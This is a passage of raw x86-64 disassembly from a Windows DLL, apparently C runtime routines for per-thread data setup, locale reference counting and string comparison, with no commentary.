   1800078e3:	48 8b 88 88 00 00 00 	mov    0x88(%rax),%rcx
   1800078ea:	48 89 4f 10          	mov    %rcx,0x10(%rdi)
   1800078ee:	48 8b c8             	mov    %rax,%rcx
   1800078f1:	e8 0a 36 00 00       	call   0x18000af00
   1800078f6:	48 8b 0f             	mov    (%rdi),%rcx
   1800078f9:	48 8d 57 10          	lea    0x10(%rdi),%rdx
   1800078fd:	e8 32 36 00 00       	call   0x18000af34
   180007902:	48 8b 0f             	mov    (%rdi),%rcx
   180007905:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   18000790b:	a8 02                	test   $0x2,%al
   18000790d:	75 0d                	jne    0x18000791c
   18000790f:	83 c8 02             	or     $0x2,%eax
   180007912:	89 81 a8 03 00 00    	mov    %eax,0x3a8(%rcx)
   180007918:	c6 47 18 01          	movb   $0x1,0x18(%rdi)
   18000791c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180007921:	48 8b c7             	mov    %rdi,%rax
   180007924:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180007929:	48 83 c4 20          	add    $0x20,%rsp
   18000792d:	5f                   	pop    %rdi
   18000792e:	c3                   	ret
   18000792f:	cc                   	int3
   180007930:	cc                   	int3
   180007931:	cc                   	int3
   180007932:	cc                   	int3
   180007933:	cc                   	int3
   180007934:	cc                   	int3
   180007935:	cc                   	int3
   180007936:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000793d:	00 00 00 
   180007940:	48 2b d1             	sub    %rcx,%rdx
   180007943:	4d 85 c0             	test   %r8,%r8
   180007946:	74 6a                	je     0x1800079b2
   180007948:	f7 c1 07 00 00 00    	test   $0x7,%ecx
   18000794e:	74 1d                	je     0x18000796d
   180007950:	0f b6 01             	movzbl (%rcx),%eax
   180007953:	3a 04 0a             	cmp    (%rdx,%rcx,1),%al
   180007956:	75 5d                	jne    0x1800079b5
   180007958:	48 ff c1             	inc    %rcx
   18000795b:	49 ff c8             	dec    %r8
   18000795e:	74 52                	je     0x1800079b2
   180007960:	84 c0                	test   %al,%al
   180007962:	74 4e                	je     0x1800079b2
   180007964:	48 f7 c1 07 00 00 00 	test   $0x7,%rcx
   18000796b:	75 e3                	jne    0x180007950
   18000796d:	49 bb 80 80 80 80 80 	movabs $0x8080808080808080,%r11
   180007974:	80 80 80 
   180007977:	49 ba ff fe fe fe fe 	movabs $0xfefefefefefefeff,%r10
   18000797e:	fe fe fe 
   180007981:	8d 04 0a             	lea    (%rdx,%rcx,1),%eax
   180007984:	25 ff 0f 00 00       	and    $0xfff,%eax
   180007989:	3d f8 0f 00 00       	cmp    $0xff8,%eax
   18000798e:	77 c0                	ja     0x180007950
   180007990:	48 8b 01             	mov    (%rcx),%rax
   180007993:	48 3b 04 0a          	cmp    (%rdx,%rcx,1),%rax
   180007997:	75 b7                	jne    0x180007950
   180007999:	48 83 c1 08          	add    $0x8,%rcx
   18000799d:	49 83 e8 08          	sub    $0x8,%r8
   1800079a1:	76 0f                	jbe    0x1800079b2
   1800079a3:	4d 8d 0c 02          	lea    (%r10,%rax,1),%r9
   1800079a7:	48 f7 d0             	not    %rax
   1800079aa:	49 23 c1             	and    %r9,%rax
   1800079ad:	49 85 c3             	test   %rax,%r11
   1800079b0:	74 cf                	je     0x180007981
   1800079b2:	33 c0                	xor    %eax,%eax
   1800079b4:	c3                   	ret
   1800079b5:	48 1b c0             	sbb    %rax,%rax
   1800079b8:	48 83 c8 01          	or     $0x1,%rax
   1800079bc:	c3                   	ret
   1800079bd:	cc                   	int3
   1800079be:	cc                   	int3
   1800079bf:	cc                   	int3
   1800079c0:	4d 85 c0             	test   %r8,%r8
   1800079c3:	75 18                	jne    0x1800079dd
   1800079c5:	33 c0                	xor    %eax,%eax
   1800079c7:	c3                   	ret
   1800079c8:	0f b7 01             	movzwl (%rcx),%eax
   1800079cb:	66 85 c0             	test   %ax,%ax
   1800079ce:	74 13                	je     0x1800079e3
   1800079d0:	66 3b 02             	cmp    (%rdx),%ax
   1800079d3:	75 0e                	jne    0x1800079e3
   1800079d5:	48 83 c1 02          	add    $0x2,%rcx
   1800079d9:	48 83 c2 02          	add    $0x2,%rdx
   1800079dd:	49 83 e8 01          	sub    $0x1,%r8
   1800079e1:	75 e5                	jne    0x1800079c8
   1800079e3:	0f b7 01             	movzwl (%rcx),%eax
   1800079e6:	0f b7 0a             	movzwl (%rdx),%ecx
   1800079e9:	2b c1                	sub    %ecx,%eax
   1800079eb:	c3                   	ret
   1800079ec:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800079f1:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1800079f6:	57                   	push   %rdi
   1800079f7:	48 83 ec 20          	sub    $0x20,%rsp
   1800079fb:	49 8b d9             	mov    %r9,%rbx
   1800079fe:	49 8b f8             	mov    %r8,%rdi
   180007a01:	8b 0a                	mov    (%rdx),%ecx
   180007a03:	e8 90 06 00 00       	call   0x180008098
   180007a08:	90                   	nop
   180007a09:	48 8b 07             	mov    (%rdi),%rax
   180007a0c:	48 8b 08             	mov    (%rax),%rcx
   180007a0f:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   180007a16:	f0 ff 00             	lock incl (%rax)
   180007a19:	8b 0b                	mov    (%rbx),%ecx
   180007a1b:	e8 cc 06 00 00       	call   0x1800080ec
   180007a20:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180007a25:	48 83 c4 20          	add    $0x20,%rsp
   180007a29:	5f                   	pop    %rdi
   180007a2a:	c3                   	ret
   180007a2b:	cc                   	int3
   180007a2c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180007a31:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   180007a36:	57                   	push   %rdi
   180007a37:	48 83 ec 20          	sub    $0x20,%rsp
   180007a3b:	49 8b d9             	mov    %r9,%rbx
   180007a3e:	49 8b f8             	mov    %r8,%rdi
   180007a41:	8b 0a                	mov    (%rdx),%ecx
   180007a43:	e8 50 06 00 00       	call   0x180008098
   180007a48:	90                   	nop
   180007a49:	48 8b 0f             	mov    (%rdi),%rcx
   180007a4c:	33 d2                	xor    %edx,%edx
   180007a4e:	48 8b 09             	mov    (%rcx),%rcx
   180007a51:	e8 a6 02 00 00       	call   0x180007cfc
   180007a56:	90                   	nop
   180007a57:	8b 0b                	mov    (%rbx),%ecx
   180007a59:	e8 8e 06 00 00       	call   0x1800080ec
   180007a5e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180007a63:	48 83 c4 20          	add    $0x20,%rsp
   180007a67:	5f                   	pop    %rdi
   180007a68:	c3                   	ret
   180007a69:	cc                   	int3
   180007a6a:	cc                   	int3
   180007a6b:	cc                   	int3
   180007a6c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180007a71:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   180007a76:	57                   	push   %rdi
   180007a77:	48 83 ec 20          	sub    $0x20,%rsp
   180007a7b:	49 8b d9             	mov    %r9,%rbx
   180007a7e:	49 8b f8             	mov    %r8,%rdi
   180007a81:	8b 0a                	mov    (%rdx),%ecx
   180007a83:	e8 10 06 00 00       	call   0x180008098
   180007a88:	90                   	nop
   180007a89:	48 8b 47 08          	mov    0x8(%rdi),%rax
   180007a8d:	48 8b 10             	mov    (%rax),%rdx
   180007a90:	48 8b 0f             	mov    (%rdi),%rcx
   180007a93:	48 8b 12             	mov    (%rdx),%rdx
   180007a96:	48 8b 09             	mov    (%rcx),%rcx
   180007a99:	e8 5e 02 00 00       	call   0x180007cfc
   180007a9e:	90                   	nop
   180007a9f:	8b 0b                	mov    (%rbx),%ecx
   180007aa1:	e8 46 06 00 00       	call   0x1800080ec
   180007aa6:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180007aab:	48 83 c4 20          	add    $0x20,%rsp
   180007aaf:	5f                   	pop    %rdi
   180007ab0:	c3                   	ret
   180007ab1:	cc                   	int3
   180007ab2:	cc                   	int3
   180007ab3:	cc                   	int3
   180007ab4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180007ab9:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   180007abe:	57                   	push   %rdi
   180007abf:	48 83 ec 20          	sub    $0x20,%rsp
   180007ac3:	49 8b d9             	mov    %r9,%rbx
   180007ac6:	49 8b f8             	mov    %r8,%rdi
   180007ac9:	8b 0a                	mov    (%rdx),%ecx
   180007acb:	e8 c8 05 00 00       	call   0x180008098
   180007ad0:	90                   	nop
   180007ad1:	48 8b 07             	mov    (%rdi),%rax
   180007ad4:	48 8b 08             	mov    (%rax),%rcx
   180007ad7:	48 8b 89 88 00 00 00 	mov    0x88(%rcx),%rcx
   180007ade:	48 85 c9             	test   %rcx,%rcx
   180007ae1:	74 1e                	je     0x180007b01
   180007ae3:	83 c8 ff             	or     $0xffffffff,%eax
   180007ae6:	f0 0f c1 01          	lock xadd %eax,(%rcx)
   180007aea:	83 f8 01             	cmp    $0x1,%eax
   180007aed:	75 12                	jne    0x180007b01
   180007aef:	48 8d 05 6a 25 01 00 	lea    0x1256a(%rip),%rax        # 0x18001a060
   180007af6:	48 3b c8             	cmp    %rax,%rcx
   180007af9:	74 06                	je     0x180007b01
   180007afb:	e8 94 07 00 00       	call   0x180008294
   180007b00:	90                   	nop
   180007b01:	8b 0b                	mov    (%rbx),%ecx
   180007b03:	e8 e4 05 00 00       	call   0x1800080ec
   180007b08:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180007b0d:	48 83 c4 20          	add    $0x20,%rsp
   180007b11:	5f                   	pop    %rdi
   180007b12:	c3                   	ret
   180007b13:	cc                   	int3
   180007b14:	40 55                	rex push %rbp
   180007b16:	48 8b ec             	mov    %rsp,%rbp
   180007b19:	48 83 ec 50          	sub    $0x50,%rsp
   180007b1d:	48 89 4d d8          	mov    %rcx,-0x28(%rbp)
   180007b21:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   180007b25:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   180007b29:	4c 8d 4d 20          	lea    0x20(%rbp),%r9
   180007b2d:	ba 01 00 00 00       	mov    $0x1,%edx
   180007b32:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   180007b36:	b8 05 00 00 00       	mov    $0x5,%eax
   180007b3b:	89 45 20             	mov    %eax,0x20(%rbp)
   180007b3e:	89 45 28             	mov    %eax,0x28(%rbp)
   180007b41:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   180007b45:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   180007b49:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
   180007b4d:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   180007b51:	b8 04 00 00 00       	mov    $0x4,%eax
   180007b56:	89 45 d0             	mov    %eax,-0x30(%rbp)
   180007b59:	89 45 d4             	mov    %eax,-0x2c(%rbp)
   180007b5c:	48 8d 05 fd 40 01 00 	lea    0x140fd(%rip),%rax        # 0x18001bc60
   180007b63:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   180007b67:	89 51 28             	mov    %edx,0x28(%rcx)
   180007b6a:	48 8d 0d 3f 98 00 00 	lea    0x983f(%rip),%rcx        # 0x1800113b0
   180007b71:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   180007b75:	48 89 08             	mov    %rcx,(%rax)
   180007b78:	48 8d 0d e1 24 01 00 	lea    0x124e1(%rip),%rcx        # 0x18001a060
   180007b7f:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   180007b83:	89 90 a8 03 00 00    	mov    %edx,0x3a8(%rax)
   180007b89:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   180007b8d:	48 89 88 88 00 00 00 	mov    %rcx,0x88(%rax)
   180007b94:	8d 4a 42             	lea    0x42(%rdx),%ecx
   180007b97:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   180007b9b:	48 8d 55 28          	lea    0x28(%rbp),%rdx
   180007b9f:	66 89 88 bc 00 00 00 	mov    %cx,0xbc(%rax)
   180007ba6:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   180007baa:	66 89 88 c2 01 00 00 	mov    %cx,0x1c2(%rax)
   180007bb1:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   180007bb5:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   180007bb9:	48 83 a0 a0 03 00 00 	andq   $0x0,0x3a0(%rax)
   180007bc0:	00 
   180007bc1:	e8 26 fe ff ff       	call   0x1800079ec
   180007bc6:	4c 8d 4d d0          	lea    -0x30(%rbp),%r9
   180007bca:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   180007bce:	48 8d 55 d4          	lea    -0x2c(%rbp),%rdx
   180007bd2:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   180007bd6:	e8 91 fe ff ff       	call   0x180007a6c
   180007bdb:	48 83 c4 50          	add    $0x50,%rsp
   180007bdf:	5d                   	pop    %rbp
   180007be0:	c3                   	ret
   180007be1:	cc                   	int3
   180007be2:	cc                   	int3
   180007be3:	cc                   	int3
   180007be4:	48 85 c9             	test   %rcx,%rcx
   180007be7:	74 1a                	je     0x180007c03
   180007be9:	53                   	push   %rbx
   180007bea:	48 83 ec 20          	sub    $0x20,%rsp
   180007bee:	48 8b d9             	mov    %rcx,%rbx
   180007bf1:	e8 0e 00 00 00       	call   0x180007c04
   180007bf6:	48 8b cb             	mov    %rbx,%rcx
   180007bf9:	e8 96 06 00 00       	call   0x180008294
   180007bfe:	48 83 c4 20          	add    $0x20,%rsp
   180007c02:	5b                   	pop    %rbx
   180007c03:	c3                   	ret
   180007c04:	40 55                	rex push %rbp
   180007c06:	48 8b ec             	mov    %rsp,%rbp
   180007c09:	48 83 ec 40          	sub    $0x40,%rsp
   180007c0d:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
   180007c11:	48 89 4d e8          	mov    %rcx,-0x18(%rbp)
   180007c15:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   180007c19:	48 8d 15 90 97 00 00 	lea    0x9790(%rip),%rdx        # 0x1800113b0
   180007c20:	b8 05 00 00 00       	mov    $0x5,%eax
   180007c25:	89 45 20             	mov    %eax,0x20(%rbp)
   180007c28:	89 45 28             	mov    %eax,0x28(%rbp)
   180007c2b:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
   180007c2f:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   180007c33:	b8 04 00 00 00       	mov    $0x4,%eax
   180007c38:	89 45 e0             	mov    %eax,-0x20(%rbp)
   180007c3b:	89 45 e4             	mov    %eax,-0x1c(%rbp)
   180007c3e:	48 8b 01             	mov    (%rcx),%rax
   180007c41:	48 3b c2             	cmp    %rdx,%rax
   180007c44:	74 0c                	je     0x180007c52
   180007c46:	48 8b c8             	mov    %rax,%rcx
   180007c49:	e8 46 06 00 00       	call   0x180008294
   180007c4e:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   180007c52:	48 8b 49 70          	mov    0x70(%rcx),%rcx
   180007c56:	e8 39 06 00 00       	call   0x180008294
   180007c5b:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   180007c5f:	48 8b 49 58          	mov    0x58(%rcx),%rcx
   180007c63:	e8 2c 06 00 00       	call   0x180008294
   180007c68:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   180007c6c:	48 8b 49 60          	mov    0x60(%rcx),%rcx
   180007c70:	e8 1f 06 00 00       	call   0x180008294
   180007c75:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   180007c79:	48 8b 49 68          	mov    0x68(%rcx),%rcx
   180007c7d:	e8 12 06 00 00       	call   0x180008294
   180007c82:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   180007c86:	48 8b 49 48          	mov    0x48(%rcx),%rcx
   180007c8a:	e8 05 06 00 00       	call   0x180008294
   180007c8f:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   180007c93:	48 8b 49 50          	mov    0x50(%rcx),%rcx
   180007c97:	e8 f8 05 00 00       	call   0x180008294
   180007c9c:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   180007ca0:	48 8b 49 78          	mov    0x78(%rcx),%rcx
   180007ca4:	e8 eb 05 00 00       	call   0x180008294
   180007ca9:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   180007cad:	48 8b 89 80 00 00 00 	mov    0x80(%rcx),%rcx
   180007cb4:	e8 db 05 00 00       	call   0x180008294
   180007cb9:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   180007cbd:	48 8b 89 c0 03 00 00 	mov    0x3c0(%rcx),%rcx
   180007cc4:	e8 cb 05 00 00       	call   0x180008294
   180007cc9:	4c 8d 4d 20          	lea    0x20(%rbp),%r9
   180007ccd:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   180007cd1:	48 8d 55 28          	lea    0x28(%rbp),%rdx
   180007cd5:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   180007cd9:	e8 d6 fd ff ff       	call   0x180007ab4
   180007cde:	4c 8d 4d e0          	lea    -0x20(%rbp),%r9
   180007ce2:	4c 8d 45 f8          	lea    -0x8(%rbp),%r8
   180007ce6:	48 8d 55 e4          	lea    -0x1c(%rbp),%rdx
   180007cea:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   180007cee:	e8 39 fd ff ff       	call   0x180007a2c
   180007cf3:	48 83 c4 40          	add    $0x40,%rsp
   180007cf7:	5d                   	pop    %rbp
   180007cf8:	c3                   	ret
   180007cf9:	cc                   	int3
   180007cfa:	cc                   	int3
   180007cfb:	cc                   	int3
   180007cfc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180007d01:	57                   	push   %rdi
   180007d02:	48 83 ec 20          	sub    $0x20,%rsp
   180007d06:	48 8b f9             	mov    %rcx,%rdi
   180007d09:	48 8b da             	mov    %rdx,%rbx
   180007d0c:	48 8b 89 90 00 00 00 	mov    0x90(%rcx),%rcx
   180007d13:	48 85 c9             	test   %rcx,%rcx
   180007d16:	74 2c                	je     0x180007d44
   180007d18:	e8 db 35 00 00       	call   0x18000b2f8
   180007d1d:	48 8b 8f 90 00 00 00 	mov    0x90(%rdi),%rcx
   180007d24:	48 3b 0d 35 3f 01 00 	cmp    0x13f35(%rip),%rcx        # 0x18001bc60
   180007d2b:	74 17                	je     0x180007d44
   180007d2d:	48 8d 05 6c 28 01 00 	lea    0x1286c(%rip),%rax        # 0x18001a5a0
   180007d34:	48 3b c8             	cmp    %rax,%rcx
   180007d37:	74 0b                	je     0x180007d44
   180007d39:	83 79 10 00          	cmpl   $0x0,0x10(%rcx)
   180007d3d:	75 05                	jne    0x180007d44
   180007d3f:	e8 b4 33 00 00       	call   0x18000b0f8
   180007d44:	48 89 9f 90 00 00 00 	mov    %rbx,0x90(%rdi)
   180007d4b:	48 85 db             	test   %rbx,%rbx
   180007d4e:	74 08                	je     0x180007d58
   180007d50:	48 8b cb             	mov    %rbx,%rcx
   180007d53:	e8 14 33 00 00       	call   0x18000b06c
   180007d58:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180007d5d:	48 83 c4 20          	add    $0x20,%rsp
   180007d61:	5f                   	pop    %rdi
   180007d62:	c3                   	ret
   180007d63:	cc                   	int3
   180007d64:	40 53                	rex push %rbx
   180007d66:	48 83 ec 20          	sub    $0x20,%rsp
   180007d6a:	8b 0d e0 22 01 00    	mov    0x122e0(%rip),%ecx        # 0x18001a050
   180007d70:	83 f9 ff             	cmp    $0xffffffff,%ecx
   180007d73:	74 2a                	je     0x180007d9f
   180007d75:	e8 02 22 00 00       	call   0x180009f7c
   180007d7a:	48 8b d8             	mov    %rax,%rbx
   180007d7d:	48 85 c0             	test   %rax,%rax
   180007d80:	74 1d                	je     0x180007d9f
   180007d82:	8b 0d c8 22 01 00    	mov    0x122c8(%rip),%ecx        # 0x18001a050
   180007d88:	33 d2                	xor    %edx,%edx
   180007d8a:	e8 35 22 00 00       	call   0x180009fc4
   180007d8f:	48 8b cb             	mov    %rbx,%rcx
   180007d92:	e8 6d fe ff ff       	call   0x180007c04
   180007d97:	48 8b cb             	mov    %rbx,%rcx
   180007d9a:	e8 f5 04 00 00       	call   0x180008294
   180007d9f:	48 83 c4 20          	add    $0x20,%rsp
   180007da3:	5b                   	pop    %rbx
   180007da4:	c3                   	ret
   180007da5:	cc                   	int3
   180007da6:	cc                   	int3
   180007da7:	cc                   	int3
   180007da8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180007dad:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180007db2:	57                   	push   %rdi
   180007db3:	48 83 ec 20          	sub    $0x20,%rsp
   180007db7:	ff 15 03 83 00 00    	call   *0x8303(%rip)        # 0x1800100c0
   180007dbd:	8b 0d 8d 22 01 00    	mov    0x1228d(%rip),%ecx        # 0x18001a050
   180007dc3:	8b d8                	mov    %eax,%ebx
   180007dc5:	83 f9 ff             	cmp    $0xffffffff,%ecx
   180007dc8:	74 1f                	je     0x180007de9
   180007dca:	e8 ad 21 00 00       	call   0x180009f7c
   180007dcf:	48 8b f8             	mov    %rax,%rdi
   180007dd2:	48 85 c0             	test   %rax,%rax
   180007dd5:	74 0c                	je     0x180007de3
   180007dd7:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   180007ddb:	75 73                	jne    0x180007e50
   180007ddd:	33 ff                	xor    %edi,%edi
   180007ddf:	33 f6                	xor    %esi,%esi
   180007de1:	eb 70                	jmp    0x180007e53
   180007de3:	8b 0d 67 22 01 00    	mov    0x12267(%rip),%ecx        # 0x18001a050
   180007de9:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   180007ded:	e8 d2 21 00 00       	call   0x180009fc4
   180007df2:	85 c0                	test   %eax,%eax
   180007df4:	74 e7                	je     0x180007ddd
   180007df6:	ba c8 03 00 00       	mov    $0x3c8,%edx
   180007dfb:	b9 01 00 00 00       	mov    $0x1,%ecx
   180007e00:	e8 17 04 00 00       	call   0x18000821c
   180007e05:	8b 0d 45 22 01 00    	mov    0x12245(%rip),%ecx        # 0x18001a050
   180007e0b:	48 8b f8             	mov    %rax,%rdi
   180007e0e:	48 85 c0             	test   %rax,%rax
   180007e11:	75 10                	jne    0x180007e23
   180007e13:	33 d2                	xor    %edx,%edx
   180007e15:	e8 aa 21 00 00       	call   0x180009fc4
   180007e1a:	33 c9                	xor    %ecx,%ecx
   180007e1c:	e8 73 04 00 00       	call   0x180008294
   180007e21:	eb ba                	jmp    0x180007ddd
   180007e23:	48 8b d7             	mov    %rdi,%rdx
   180007e26:	e8 99 21 00 00       	call   0x180009fc4
   180007e2b:	85 c0                	test   %eax,%eax
   180007e2d:	75 12                	jne    0x180007e41
   180007e2f:	8b 0d 1b 22 01 00    	mov    0x1221b(%rip),%ecx        # 0x18001a050
   180007e35:	33 d2                	xor    %edx,%edx
   180007e37:	e8 88 21 00 00       	call   0x180009fc4
   180007e3c:	48 8b cf             	mov    %rdi,%rcx
   180007e3f:	eb db                	jmp    0x180007e1c
   180007e41:	48 8b cf             	mov    %rdi,%rcx
   180007e44:	e8 cb fc ff ff       	call   0x180007b14
   180007e49:	33 c9                	xor    %ecx,%ecx
   180007e4b:	e8 44 04 00 00       	call   0x180008294
   180007e50:	48 8b f7             	mov    %rdi,%rsi
   180007e53:	8b cb                	mov    %ebx,%ecx
   180007e55:	ff 15 6d 82 00 00    	call   *0x826d(%rip)        # 0x1800100c8
   180007e5b:	48 f7 df             	neg    %rdi
   180007e5e:	48 1b c0             	sbb    %rax,%rax
   180007e61:	48 23 c6             	and    %rsi,%rax
   180007e64:	74 10                	je     0x180007e76
   180007e66:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180007e6b:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180007e70:	48 83 c4 20          	add    $0x20,%rsp
   180007e74:	5f                   	pop    %rdi
   180007e75:	c3                   	ret
   180007e76:	e8 59 f9 ff ff       	call   0x1800077d4
   180007e7b:	cc                   	int3
   180007e7c:	40 53                	rex push %rbx
   180007e7e:	48 83 ec 20          	sub    $0x20,%rsp
   180007e82:	8b 0d c8 21 01 00    	mov    0x121c8(%rip),%ecx        # 0x18001a050
   180007e88:	83 f9 ff             	cmp    $0xffffffff,%ecx
   180007e8b:	74 1b                	je     0x180007ea8
   180007e8d:	e8 ea 20 00 00       	call   0x180009f7c
   180007e92:	48 8b d8             	mov    %rax,%rbx
   180007e95:	48 85 c0             	test   %rax,%rax
   180007e98:	74 08                	je     0x180007ea2
   180007e9a:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   180007e9e:	74 7d                	je     0x180007f1d
   180007ea0:	eb 6d                	jmp    0x180007f0f
   180007ea2:	8b 0d a8 21 01 00    	mov    0x121a8(%rip),%ecx        # 0x18001a050
   180007ea8:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   180007eac:	e8 13 21 00 00       	call   0x180009fc4
   180007eb1:	85 c0                	test   %eax,%eax
   180007eb3:	74 68                	je     0x180007f1d
   180007eb5:	ba c8 03 00 00       	mov    $0x3c8,%edx
   180007eba:	b9 01 00 00 00       	mov    $0x1,%ecx
   180007ebf:	e8 58 03 00 00       	call   0x18000821c
   180007ec4:	8b 0d 86 21 01 00    	mov    0x12186(%rip),%ecx        # 0x18001a050
   180007eca:	48 8b d8             	mov    %rax,%rbx
   180007ecd:	48 85 c0             	test   %rax,%rax
   180007ed0:	75 10                	jne    0x180007ee2
   180007ed2:	33 d2                	xor    %edx,%edx
   180007ed4:	e8 eb 20 00 00       	call   0x180009fc4
   180007ed9:	33 c9                	xor    %ecx,%ecx
   180007edb:	e8 b4 03 00 00       	call   0x180008294
   180007ee0:	eb 3b                	jmp    0x180007f1d
   180007ee2:	48 8b d3             	mov    %rbx,%rdx
   180007ee5:	e8 da 20 00 00       	call   0x180009fc4
   180007eea:	85 c0                	test   %eax,%eax
   180007eec:	75 12                	jne    0x180007f00
   180007eee:	8b 0d 5c 21 01 00    	mov    0x1215c(%rip),%ecx        # 0x18001a050
   180007ef4:	33 d2                	xor    %edx,%edx
   180007ef6:	e8 c9 20 00 00       	call   0x180009fc4
   180007efb:	48 8b cb             	mov    %rbx,%rcx
   180007efe:	eb db                	jmp    0x180007edb
   180007f00:	48 8b cb             	mov    %rbx,%rcx
   180007f03:	e8 0c fc ff ff       	call   0x180007b14
   180007f08:	33 c9                	xor    %ecx,%ecx
   180007f0a:	e8 85 03 00 00       	call   0x180008294
   180007f0f:	48 85 db             	test   %rbx,%rbx
   180007f12:	74 09                	je     0x180007f1d
   180007f14:	48 8b c3             	mov    %rbx,%rax
   180007f17:	48 83 c4 20          	add    $0x20,%rsp
   180007f1b:	5b                   	pop    %rbx
   180007f1c:	c3                   	ret
   180007f1d:	e8 b2 f8 ff ff       	call   0x1800077d4
   180007f22:	cc                   	int3
   180007f23:	cc                   	int3
   180007f24:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180007f29:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180007f2e:	57                   	push   %rdi
   180007f2f:	48 83 ec 20          	sub    $0x20,%rsp
   180007f33:	ff 15 87 81 00 00    	call   *0x8187(%rip)        # 0x1800100c0
   180007f39:	8b 0d 11 21 01 00    	mov    0x12111(%rip),%ecx        # 0x18001a050
   180007f3f:	8b d8                	mov    %eax,%ebx
   180007f41:	83 f9 ff             	cmp    $0xffffffff,%ecx
   180007f44:	74 1f                	je     0x180007f65
   180007f46:	e8 31 20 00 00       	call   0x180009f7c
   180007f4b:	48 8b f8             	mov    %rax,%rdi
   180007f4e:	48 85 c0             	test   %rax,%rax
   180007f51:	74 0c                	je     0x180007f5f
   180007f53:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   180007f57:	75 73                	jne    0x180007fcc
   180007f59:	33 ff                	xor    %edi,%edi
   180007f5b:	33 f6                	xor    %esi,%esi
   180007f5d:	eb 70                	jmp    0x180007fcf
   180007f5f:	8b 0d eb 20 01 00    	mov    0x120eb(%rip),%ecx        # 0x18001a050
   180007f65:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   180007f69:	e8 56 20 00 00       	call   0x180009fc4
   180007f6e:	85 c0                	test   %eax,%eax
   180007f70:	74 e7                	je     0x180007f59
   180007f72:	ba c8 03 00 00       	mov    $0x3c8,%edx
   180007f77:	b9 01 00 00 00       	mov    $0x1,%ecx
   180007f7c:	e8 9b 02 00 00       	call   0x18000821c
   180007f81:	8b 0d c9 20 01 00    	mov    0x120c9(%rip),%ecx        # 0x18001a050
   180007f87:	48 8b f8             	mov    %rax,%rdi
   180007f8a:	48 85 c0             	test   %rax,%rax
   180007f8d:	75 10                	jne    0x180007f9f
   180007f8f:	33 d2                	xor    %edx,%edx
   180007f91:	e8 2e 20 00 00       	call   0x180009fc4
   180007f96:	33 c9                	xor    %ecx,%ecx
   180007f98:	e8 f7 02 00 00       	call   0x180008294
   180007f9d:	eb ba                	jmp    0x180007f59
   180007f9f:	48 8b d7             	mov    %rdi,%rdx
   180007fa2:	e8 1d 20 00 00       	call   0x180009fc4
   180007fa7:	85 c0                	test   %eax,%eax
   180007fa9:	75 12                	jne    0x180007fbd
   180007fab:	8b 0d 9f 20 01 00    	mov    0x1209f(%rip),%ecx        # 0x18001a050
   180007fb1:	33 d2                	xor    %edx,%edx
   180007fb3:	e8 0c 20 00 00       	call   0x180009fc4
   180007fb8:	48 8b cf             	mov    %rdi,%rcx
   180007fbb:	eb db                	jmp    0x180007f98
   180007fbd:	48 8b cf             	mov    %rdi,%rcx
   180007fc0:	e8 4f fb ff ff       	call   0x180007b14
